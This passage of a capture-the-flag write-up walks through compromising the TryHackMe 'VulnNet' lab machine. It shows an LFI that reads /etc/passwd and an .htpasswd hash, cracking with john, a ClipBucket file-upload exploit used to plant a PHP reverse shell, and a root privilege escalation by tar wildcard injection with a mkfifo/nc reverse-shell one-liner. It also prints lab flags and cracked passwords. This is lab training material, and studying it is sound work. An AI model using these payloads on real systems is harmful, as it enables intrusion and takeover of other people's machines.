|   256 055399fc9810b5c368006c2941daa5c9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKNuqHl39hJpIduBG9J7QwetpgO1PWQSUDL/rvjXPiWw
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 8B7969B10EDA5D739468F4D3F2296496
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: VulnNet
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></details></li></ul><p id="95bcc721-fb16-44ea-96f9-ace4cc729cac" class="">
</p><ul id="9c12eeaf-c857-4a5f-9833-31af9b899116" class="toggle"><li><details open=""><summary><strong>Fuzzing Dir (not intersting)</strong></summary><pre id="50525e3f-4d2e-452e-8732-517a5886b26b" class="code"><code>┌──(nazu㉿Nazu)-[~/Desktop/CTF/THM-CTF/VulnNet]
└─$ sudo dirb http://vulnnet.thm/
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Jan 27 10:54:41 2023
URL_BASE: http://vulnnet.thm/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://vulnnet.thm/ ----
==&gt; DIRECTORY: http://vulnnet.thm/css/                                                                                                                                
==&gt; DIRECTORY: http://vulnnet.thm/fonts/                                                                                                                              
==&gt; DIRECTORY: http://vulnnet.thm/img/                                                                                                                                
+ http://vulnnet.thm/index.php (CODE:200|SIZE:5829)                                                                                                                   
==&gt; DIRECTORY: http://vulnnet.thm/js/</code></pre></details></li></ul><p id="b329c192-9176-47bd-aa6e-41b864d674b1" class="">
</p><ul id="ebc3043b-38eb-482e-9ffe-4b367ba2a81e" class="toggle"><li><details open=""><summary><strong>Fuzzing Sub-domain</strong></summary><pre id="18850e9a-145d-46ff-969f-7ec9ade4955e" class="code"><code>┌──(nazu㉿Nazu)-[~/Desktop/CTF/THM-CTF/VulnNet]
└─$ knockpy vulnnet.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
==&gt; broadcast.vulnnet.thm</code></pre><p id="d8462525-5cff-4ecc-a7b9-400137e91ed4" class=""><mark class="highlight-red_background"><strong>Unauthorized.</strong></mark><strong>so we have to scan our main domain</strong><div class="indented"><ul id="aed5b40e-b9f1-4e79-b040-38b9ab8e930b" class="bulleted-list"><li style="list-style-type:disc"><strong>like before we check source code</strong></li></ul><ul id="40aa7a7d-8b35-497e-afdb-6d1c36cf178a" class="bulleted-list"><li style="list-style-type:disc"><strong>cert</strong></li></ul><ul id="b35c3072-0ed8-4e6a-b813-5926c7cedadd" class="bulleted-list"><li style="list-style-type:disc"><strong>domin under a domain at least 4 times</strong></li></ul><ul id="fe2ff3e7-e589-4a43-8f35-63f041776ada" class="bulleted-list"><li style="list-style-type:disc"><strong>and also </strong><span style="border-bottom:0.05em solid"><strong>fuzzing</strong></span><strong> our </strong><span style="border-bottom:0.05em solid"><strong>broadcast.vulnnet.thm</strong></span><strong> for </strong><span style="border-bottom:0.05em solid"><strong>hidden</strong></span><strong> </strong><span style="border-bottom:0.05em solid"><strong>dir</strong></span><strong> and </strong><span style="border-bottom:0.05em solid"><strong>urls</strong></span><strong>.</strong></li></ul><p id="e707019d-bbe8-45ea-815f-ed414e59f098" class=""><strong>You can use burp suite😈</strong></p></div></p></details></li></ul><h1 id="4fc9f39b-7048-47f3-822c-5d0c8aee51af" class="">Exploitation:</h1><p id="70854370-e99a-4d36-84bb-c046ad49ef6a" class="">On js file <a href="http://vulnnet.thm/js/index__d8338055.js"><code>http://vulnnet.thm/js/index__d8338055.js</code></a> we found this:<div class="indented"><ul id="433f189b-7cb9-4940-8819-9cb5bb6bb242" class="bulleted-list"><li style="list-style-type:disc"><code>http://vulnnet.thm/index.php?referer=&quot;</code> ⇒ Referer is an HTTP header field that identifies the address of the webpage ex. the URI that linked to the resource being requested. </li></ul><ul id="8d9e7f15-a271-4aa6-9f31-2f6b45abfb0c" class="bulleted-list"><li style="list-style-type:disc">so let’s try to inject someting on it. we know our target is linux. that means we must use linux stuff things</li></ul><ul id="7cf7613e-4941-4e7a-933e-ebf5b12e0d75" class="bulleted-list"><li style="list-style-type:disc">in this case i used <a href="https://github.com/DragonJAR/Security-Wordlist/blob/main/LFI-WordList-Linux"><mark class="highlight-red_background"><strong><strong>LFI Linux WordList</strong></strong></mark></a><strong><strong> from sec list.</strong></strong></li></ul><ul id="fe635dfe-0beb-4977-b37c-34ee1d39dfd1" class="toggle"><li><details open=""><summary><strong>Boom we found this💣</strong></summary><p id="0c3013bf-474f-454e-8c55-da6548f20134" class=""><code>view-source:</code><code><a href="http://vulnnet.thm/index.php?referer=/etc/passwd">http://vulnnet.thm/index.php?referer=/etc/passwd</a></code></p><pre id="fceb1f54-8389-4dd4-995f-0848ada9ba60" class="code"><code>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin
lightdm:x:106:113:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:107:117::/nonexistent:/bin/false
kernoops:x:108:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
pulse:x:109:119:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
avahi:x:110:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
hplip:x:111:7:HPLIP system user,,,:/var/run/hplip:/bin/false
server-management:x:1000:1000:server-management,,,:/home/server-management:/bin/bash
mysql:x:112:123:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin</code></pre><blockquote id="bbda4def-a20f-4744-8c19-23910e06c913" class=""><strong><mark class="highlight-red_background">/etc/passwd</mark></strong><strong> is a text file in </strong><strong><mark class="highlight-red_background">Linux</mark></strong><strong> that stores information about the users on the system, such as their </strong><strong><mark class="highlight-red_background">login</mark></strong><strong>, user </strong><strong><mark class="highlight-red_background">ID</mark></strong><strong> number, </strong><mark class="highlight-red_background"><strong>directory</strong></mark><strong>.</strong></blockquote></details></li></ul></div></p><ul id="cfe5d5b8-b7f0-4985-8b8d-79e63af31754" class="bulleted-list"><li style="list-style-type:disc"><code>view-source:</code><code><a href="http://vulnnet.thm/index.php?referer=/etc/apache2/sites-enabled/000-default.conf">http://vulnnet.thm/index.php?referer=/etc/apache2/sites-enabled/000-default.conf</a></code> on this URL we found some cool informations😈<pre id="2da5f233-439f-4263-9c44-b6cf9a482be8" class="code"><code>&lt;VirtualHost *:80&gt;
	ServerAdmin webmaster@localhost
	ServerName vulnnet.thm
	DocumentRoot /var/www/main
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
	&lt;Directory /var/www/main&gt;
		Order allow,deny
		allow from all
	&lt;/Directory&gt;
&lt;/VirtualHost&gt;

&lt;VirtualHost *:80&gt;
	ServerAdmin webmaster@localhost
	ServerName broadcast.vulnnet.thm
	DocumentRoot /var/www/html
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
	&lt;Directory /var/www/html&gt;
		Order allow,deny
		allow from all
		AuthType Basic
		AuthName &quot;Restricted Content&quot;
		AuthUserFile /etc/apache2/.htpasswd
		Require valid-user
	&lt;/Directory&gt;
&lt;/VirtualHost&gt;</code></pre></li></ul><ul id="f75d1dd8-a5f0-48dc-bb5e-839797d7817b" class="bulleted-list"><li style="list-style-type:disc"><strong><code>view-source:</code></strong><strong><code><a href="http://vulnnet.thm/index.php?referer=/etc/apache2/.htpasswd">http://vulnnet.thm/index.php?referer=/etc/apache2/.htpasswd</a></code></strong><strong> on this URL we found usernma with hashed password ⇒ </strong><strong><code>developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0</code></strong></li></ul><ul id="b93a7021-7dff-491b-aada-8411f8c0db2b" class="bulleted-list"><li style="list-style-type:disc"><strong>so let’s crack using </strong><strong><code>john</code></strong><pre id="787386f1-f806-4009-b5a3-99b5d8154db8" class="code"><code>┌──(nazu㉿Nazu)-[~/Desktop/CTF/THM-CTF/VulnNet]
└─$ echo &quot;developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0&quot; &gt; hash.txt

┌──(nazu㉿Nazu)-[~/Desktop/CTF/THM-CTF/VulnNet]
└─$ john --wordlist=/home/nazu/Desktop/Word-List/rockyou.txt hash.txt
pass =&gt; 9972761drmfsls
user =&gt; developers</code></pre><p id="71af19dd-12e0-4549-9547-52b04c0a89bd" class=""><strong>it’s not ssh password and username. it used for brodcast subdomain</strong><div class="indented"><p id="b5c9fc97-b8dc-4509-8384-269402dcc54c" class=""><strong>boom we logged in. </strong></p><p id="a3479035-8c26-43d9-9fdb-454971a25876" class=""><strong>the first step is checking for source code.</strong></p><p id="cfd0aa7a-c2fa-4ff2-8854-f413dfab8269" class=""><strong>on line 190 we found this</strong> <code>&lt;!-- ClipBucket version 4.0 --&gt;</code><strong> there are so many exploits on this versiiion </strong><strong><a href="https://www.google.com/search?client=firefox-b-e&amp;q=clipbucket+version+4.0+exploit">here</a></strong><strong>’</strong></p><pre id="9bb68a36-feb9-4abe-b78b-751a517dbeea" class="code"><code>┌──(nazu㉿Nazu)-[~/Desktop/CTF/THM-CTF/VulnNet]
└─$ searchsploit ClipBucket 4.0
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                       |  Path
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ClipBucket &lt; 4.0.0 - Release 4902 - Command Injection / File Upload / SQL Injection                                                  | php/webapps/44250.txt
ClipBucket &lt; 4.0.0 - Release 4902 - Command Injection / File Upload / SQL Injection                                                  | php/webapps/44250.txt

┌──(nazu㉿Nazu)-[~/Desktop/CTF/THM-CTF/VulnNet]
└─$ locate php/webapps/44250.txt
/usr/share/exploitdb/exploits/php/webapps/44250.txt
                                                                                                                                                                       
┌──(nazu㉿Nazu)-[~/Desktop/CTF/THM-CTF/VulnNet]
└─$ cp /usr/share/exploitdb/exploits/php/webapps/44250.txt ~/Desktop/CTF/THM-CTF/VulnNet/click.txt
                                                                                                                                                                       
┌──(nazu㉿Nazu)-[~/Desktop/CTF/THM-CTF/VulnNet]
└─$ ls                          
click.txt  hash.txt  knockpy_report</code></pre><blockquote id="f0a21510-e4b6-477f-bd04-83e61d753d8e" class="">ClipBucket is an open source <strong>video sharing platform</strong> that allows users to <mark class="highlight-red_background"><strong>upload</strong></mark>, share, and manage their videos. It is written in PHP and uses MySQL for its database. It also includes a wide range of features such as user management, video conversion, video embedding, and more.</blockquote><p id="5894cc4d-1844-49db-b2be-84c23e08481e" class=""><strong>So to get reverse shell we have to explot </strong><strong><mark class="highlight-red_background">File Upload Vuln </mark></strong><a href="https://t.me/mrnazu/626"><strong>| curl</strong></a></p><pre id="8162aeec-183c-44ab-b1ca-7f3764db818e" class="code"><code>2. Unauthenticated Arbitrary File Upload
Below is the cURL request to upload arbitrary files to the webserver with no
authentication required.

$ curl -F &quot;file=@pfile.php&quot; -F &quot;plupload=1&quot; -F &quot;name=anyname.php&quot;
&quot;http://$HOST/actions/beats_uploader.php&quot;

$ curl -F &quot;file=@pfile.php&quot; -F &quot;plupload=1&quot; -F &quot;name=anyname.php&quot;
&quot;http://$HOST/actions/photo_uploader.php&quot;</code></pre></div></p><ul id="30cd4025-02cb-43b1-9ed0-1d492dd3fb19" class="to-do-list"><li><div class="checkbox checkbox-on"></div> <span class="to-do-children-checked">PHP Reverse shell</span></li></ul><ul id="4f2d6fd0-06d4-4948-8a95-496502988733" class="to-do-list"><li><div class="checkbox checkbox-on"></div> <span class="to-do-children-checked">net cat to lestion</span></li></ul><pre id="35feef4b-316b-47b1-8da3-62c1f2fb0247" class="code"><code>┌──(nazu㉿Nazu)-[~/Desktop/CTF/THM-CTF/VulnNet]
└─$ curl -u developers:9972761drmfsls -F &quot;file=@reverse.php&quot; -F &quot;plupload=1&quot; -F &quot;name=reverse.php&quot; &quot;http://broadcast.vulnnet.thm/actions/beats_uploader.php&quot; creating file{&quot;success&quot;:&quot;yes&quot;,&quot;file_name&quot;:&quot;165752453575eede&quot;,&quot;extension&quot;:&quot;php&quot;,&quot;file_directory&quot;:&quot;CB_BEATS_UPLOAD_DIR&quot;}</code></pre></li></ul><p id="ac6a8e48-2eed-4c65-8259-ff58c843b411" class=""><strong>then go to ⇒ </strong><strong><code><a href="http://broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/">http://broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/</a></code></strong><strong> then click and open ur reversh shell</strong></p><pre id="9ccb40f8-5ccd-4296-bdfd-9da027a3f0ce" class="code"><code>┌──(nazu㉿Nazu)-[~/Desktop/CTF/THM-CTF/VulnNet]
└─$ nc -lvlp 1234
listening on [any] 1234 ...
connect to [10.18.29.75] from vulnnet.thm [10.10.76.135] 55184
Linux vulnnet 4.15.0-134-generic #138-Ubuntu SMP Fri Jan 15 10:52:18 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 18:52:45 up 4 min,  0 users,  load average: 0.27, 1.21, 0.66
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can&#x27;t access tty; job control turned off</code></pre><h1 id="acc79ceb-83ba-44e9-8634-891451eaf275" class="">Privilege Escalation:</h1><h3 id="c52fc437-9645-404a-b02b-912a8466c819" class="">cronjob:</h3><blockquote id="be2b6eda-df86-4cd4-a364-ee5e3bf7ce22" class="">A cron job is a command or script that is <strong>scheduled</strong> to run at a specified time or interval. The cron job is usually set up using the crontab command, which allows users to edit their cron table (crontab) and define commands to run periodically on a given schedule.<p id="077a9798-fa07-437b-8690-2d5fc81b4561" class="">To create a cron job, you must first edit your crontab file using the command:
<code>crontab -e</code></p><p id="31ad5c20-6fee-4607-8d96-bb9703b06765" class="">This will open an editor where you can enter your desired commands and specify when they should be executed</p></blockquote><p id="151172f8-7226-4c8e-b0c2-ab88c5dbd9e1" class="">
</p><p id="b824663c-d6d9-49a0-89df-67c6e2e03af8" class="">
</p><blockquote id="ea40d1e0-0950-4879-9777-4f87694a8f49" class="">Cronjob Privilege Escalation is a type of priv esc that exploits vulnerabilities arising from inadequate control of privileged stored procedures used to schedule jobs such as cronjobs on Linux systems. </blockquote><blockquote id="9aee2009-c29a-454d-aeb8-8b07e2b63f47" class="">For example of a Cronjob Privilege Escalation can be seen when a user with low privileges is able to configure a cronjob which is executed by root, which will elevate the user’s privileges. For example, consider a vulnerable system that allows unprivileged users to execute any program owned by the root user. If an attacker manages to insert a malicious script in the crontab entry, the script will be executed with root privileges and can effectively take control of the system resulting in privilege escalation.</blockquote><pre id="e2ccc4e7-e25e-4072-a8c2-ecea147c76e2" class="code"><code>$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/2   * * * *   root    /var/opt/backupsrv.sh
17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )</code></pre><p id="f981d4d7-ce6f-44a6-961f-ef14b0e29386" class=""><strong>That means we are allwed to run </strong><strong><code>backupsrv.sh</code></strong><strong>😈</strong></p><pre id="db1cb8fe-b4d5-48ea-accc-974b30d9415c" class="code"><code>$ cat /var/opt/backupsrv.sh
#!/bin/bash

# Where to backup to.
dest=&quot;/var/backups&quot;

# What to backup. 
cd /home/server-management/Documents
backup_files=&quot;*&quot;

# Create archive filename.
day=$(date +%A)
hostname=$(hostname -s)
archive_file=&quot;$hostname-$day.tgz&quot;

# Print start status message.
echo &quot;Backing up $backup_files to $dest/$archive_file&quot;
date
echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo &quot;Backup finished&quot;
date

# Long listing of files in $dest to check file sizes.
ls -lh $dest</code></pre><blockquote id="4f0c1a41-eafe-4eed-baa4-a57f88b10fda" class=""><strong>This script is used to create a backup of the files in the /home/server-management/ Documents directory.</strong></blockquote><p id="f5e81d6b-6dfb-4fea-9b49-6f78e863acb2" class="">
</p><p id="1509af7c-31a0-46fa-8f73-21b77d694613" class=""><strong>But we can’t🥶</strong></p><pre id="f8410d6e-8bd3-4a32-a7a6-e95b2cfd55a8" class="code"><code>$ /var/opt/backupsrv.sh
/bin/sh: 4: /var/opt/backupsrv.sh: Permission denied</code></pre><ul id="ec90fb9d-6654-4f25-a9bf-f50944664230" class="bulleted-list"><li style="list-style-type:disc">So let’s find allowed file<ul id="b107ace9-2f4c-4880-90a5-68956bcf4436" class="bulleted-list"><li style="list-style-type:circle"><code>find / -type f -user server-management 2&gt;/dev/null</code></li></ul><ul id="3617695f-effc-4d4f-8ee4-b7daa83b81ac" class="bulleted-list"><li style="list-style-type:circle"><code>/var/backups/ssh-backup.tar.gz</code> | let’s copy this file to our dir</li></ul><ul id="2435a4d6-a002-4789-bce2-0d7eca20bb32" class="bulleted-list"><li style="list-style-type:circle"><code>cp /var/backups/ssh-backup.tar.gz /var/www/html/actions/CB_BEATS_UPLOAD_DIR/ssh-backup.tar.gz</code></li></ul></li></ul><ul id="8bde2656-3f4a-4e7d-a6a3-17361e9b74a5" class="bulleted-list"><li style="list-style-type:disc">Then we download it! ⇒ <code><a href="http://broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/">http://broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/</a></code></li></ul><ul id="2d18f88e-ba02-4abe-9575-cf605d1f6204" class="bulleted-list"><li style="list-style-type:disc">when we extract it, it will give us <code>id_rsa</code> file. seems intersting!</li></ul><pre id="274d978c-bd03-4b3d-917a-6c2567fcfc38" class="code"><code>┌──(nazu㉿Nazu)-[~/Desktop/CTF/THM-CTF/VulnNet]
└─$ ssh2john id_rsa &gt; id_rsa.txt 
                                                                                                                                                                       
┌──(nazu㉿Nazu)-[~/Desktop/CTF/THM-CTF/VulnNet]
└─$ locate rockyou.txt          
/home/nazu/Desktop/Word-List/rockyou.txt
/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
/usr/share/wordlists/rockyou.txt.gz

┌──(nazu㉿Nazu)-[~/Desktop/CTF/THM-CTF/VulnNet]
└─$ john --wordlist=/home/nazu/Desktop/Word-List/rockyou.txt id_rsa.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status
oneTWO3gOyac     (id_rsa)     
1g 0:00:00:09 DONE (2023-01-27 13:21) 0.1049g/s 514941p/s 514941c/s 514941C/s one_0012..one98t7
Use the &quot;--show&quot; option to display all of the cracked passwords reliably
Session completed.</code></pre><h3 id="7dc89bbb-1a18-43c4-8a2c-229105dea1f1" class="">SSH Login with this password</h3><pre id="9223171b-b6fd-41b2-ada1-30d55c36053f" class="code"><code>┌──(nazu㉿Nazu)-[~/Desktop/CTF/THM-CTF/VulnNet]
└─$ ssh -i id_rsa server-management@10.10.76.135
The authenticity of host &#x27;10.10.76.135 (10.10.76.135)&#x27; can&#x27;t be established.
ED25519 key fingerprint is SHA256:GgnSIc02m6P4YfjO6UVJaykCDYShjpPCn/B4+fzh+4k.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:61: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added &#x27;10.10.76.135&#x27; (ED25519) to the list of known hosts.
Enter passphrase for key &#x27;id_rsa&#x27;: 
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-134-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

560 packages can be updated.
359 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

server-management@vulnnet:~$</code></pre><pre id="7ea4a5b4-3fb7-4a40-8469-c31a37bd85d7" class="code"><code>server-management@vulnnet:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
server-management@vulnnet:~$ cat user.txt
THM{907e420d979d8e2992f3d7e16bee1e8b}</code></pre><h3 id="1dc0600c-ca84-4b2b-b67c-8e356c0eff00" class="">Now, time to escalate our privilege to root to get root flag via <code>cronjob!</code> </h3><p id="4d671096-96db-4fcb-b97d-fb2a6edcc07f" class=""><a href="https://gtfobins.github.io/gtfobins/tar/">GTFBins</a></p><ul id="35ef1943-c2f4-4bef-bda9-5b86da1582e4" class="bulleted-list"><li style="list-style-type:disc"><code>echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.18.29.75 4444 &gt;/tmp/f&quot; &gt; /home/server-management/Documents/rev.sh</code></li></ul><ul id="5c2894ca-6d12-438a-8043-b530086d7cf7" class="bulleted-list"><li style="list-style-type:disc"><code>touch &quot;/home/server-management/Documents/--checkpoint=1&quot;</code></li></ul><ul id="7fbadcf6-ce25-4a80-b386-8bde91da89c9" class="bulleted-list"><li style="list-style-type:disc"><code>touch &quot;/home/server-management/Documents/--checkpoint-action=exec=sh rev.sh&quot;</code></li></ul><pre id="8ac18e4d-78d1-413c-abac-568af75dbfb8" class="code"><code>nc -nlvp 4444
listening on [any] 4444 ...
# cat /root/root.txt
THM{220b671dd8adc301b34c2738ee8295ba}</code></pre><p id="8e553a1e-5dd2-44a0-be9a-f43270de0757" class="">
</p><h1 id="0e83ad13-4274-4575-9adb-04e3c3041599" class="">Flags:</h1><ul id="77d7c080-93f6-4ee4-9c9d-f59d840e62f8" class="toggle"><li><details open=""><summary><mark class="highlight-blue_background">user.txt</mark></summary><ul id="88b550e3-1a5e-4922-a1a1-6cc981f34516" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-blue_background">THM{907e420d979d8e2992f3d7e16bee1e8b}</mark></li></ul></details></li></ul><ul id="f8ce0541-a7b5-4ebb-8c48-76d4e78c7479" class="toggle"><li><details open=""><summary><mark class="highlight-red_background">root.txt</mark></summary><ul id="d4fb6e10-fab8-4c8b-88b0-13b902c28ad8" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-red_background">THM{220b671dd8adc301b34c2738ee8295ba}</mark></li></ul></details></li></ul><hr id="dcd0507f-f20f-47fb-b96a-1af942600b3e"/><h2 id="c459b930-83df-42e7-be7f-0f4ec7e38648" class="">Improved skills</h2><ul id="0219404f-a9f2-4d5a-bcad-7485d757e271" class="bulleted-list"><li style="list-style-type:disc">cronjob</li></ul><ul id="26e03ace-0b56-45a6-961b-4df6c83ee4c9" class="bulleted-list"><li style="list-style-type:disc">prv esc</li></ul><h2 id="3a925a05-0173-4586-aea0-ba6428d9dc2c" class="">Used tools</h2><ul id="9befc0bf-4b49-47d3-9d03-fe73331e43f6" class="bulleted-list"><li style="list-style-type:disc">rustscan</li></ul><ul id="e5247722-b404-4d6e-aec5-a0852f863fd3" class="bulleted-list"><li style="list-style-type:disc">dirb</li></ul><ul id="a2a0ec9d-0e94-4e97-8eb8-4b359f5b9de0" class="bulleted-list"><li style="list-style-type:disc">knockpy</li></ul><ul id="7ce355b9-3299-49ce-badc-f4d5b3dde398" class="bulleted-list"><li style="list-style-type:disc">subfinder</li></ul><ul id="016a971d-92ed-4f33-8c81-c4f5399c4450" class="bulleted-list"><li style="list-style-type:disc">jhon</li></ul><ul id="d3034405-7053-4e63-a35f-00336de2b5a3" class="bulleted-list"><li style="list-style-type:disc">dev tool</li></ul><ul id="e14fce7e-190e-4d53-935e-6edce10f9327" class="bulleted-list"><li style="list-style-type:disc">netcat</li></ul><ul id="7148f6d8-ec6e-42c3-8d2a-d19da30d5fec" class="bulleted-list"><li style="list-style-type:disc">searchsploit</li></ul><ul id="be3450e7-9982-4bf0-b038-3e73ac3ba1ae" class="bulleted-list"><li style="list-style-type:disc">sec list</li></ul><ul id="323334d5-6fad-48a4-bd36-2f90c29b8bc5" class="bulleted-list"><li style="list-style-type:disc">gtfobins</li></ul><h1 id="1d861fee-ddfd-4dc9-8ef1-5d947d95cf12" class=""><mark class="highlight-red_background">Spen time = 4 hour</mark></h1><p id="f052b7c1-b5f7-488f-9017-416eea218ad2" class="">
</p></div></article></body></html>
